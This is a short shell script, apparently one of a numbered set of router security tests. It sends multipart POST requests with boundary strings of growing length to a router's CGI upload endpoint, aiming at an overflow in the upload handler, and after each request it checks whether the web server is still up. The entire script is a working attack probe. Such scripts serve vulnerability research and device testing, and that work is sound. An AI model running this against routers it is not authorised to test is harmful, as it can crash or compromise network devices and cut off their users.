#!/bin/sh
# 06 — multipart boundary overflow (webCgiGetUploadFile)
# usage: ./06_boundary_overflow.sh http://192.168.0.1
R=${1:?usage: $0 http://<router>}
for N in 64 128 256; do
  B=$(python3 -c "print('B'*$N)")
  printf "[boundary=%s] " "$N"
  curl -s -o /dev/null -w 'HTTP %{http_code}\n' -X POST \
    -H "Content-Type: multipart/form-data; boundary=$B" \
    --data-binary $'--'"$B"$'\r\nContent-Disposition: form-data; name="file"; filename="c.cfg"\r\n\r\nDefault\r\n--'"$B"'--\r\n' \
    "$R/cgi-bin/UploadCfg/login.asp"
  printf "   server alive: "; curl -s -o /dev/null -m 5 -w 'HTTP %{http_code}\n' "$R/login.asp" || echo "down"
done
